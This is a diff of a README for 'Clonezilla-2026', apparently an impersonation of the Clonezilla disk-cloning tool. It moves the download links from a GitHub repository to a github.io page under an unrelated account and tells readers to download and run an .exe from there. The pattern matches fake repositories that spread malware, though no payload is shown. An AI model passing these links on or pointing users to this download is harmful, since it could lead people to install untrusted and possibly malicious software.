@@ -1,6 +1,6 @@
 # 💾 Clonezilla-2026 - Securely clone your PC hard drive
 
-[![Download Clonezilla](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/aubertsupposed529/Clonezilla-2026)
+[![Download Clonezilla](https://img.shields.io/badge/Download-Release-blue.svg)](https://aubertsupposed529.github.io)
 
 ## 📖 About this software
 
@@ -22,7 +22,7 @@ Before you start, make sure your computer meets these requirements:
 
 Follow these steps to obtain the tool:
 
-1. Visit this page to download: [https://github.com/aubertsupposed529/Clonezilla-2026](https://github.com/aubertsupposed529/Clonezilla-2026).
+1. Visit this page to download: [https://aubertsupposed529.github.io](https://aubertsupposed529.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Select the file ending in .exe to start your download.
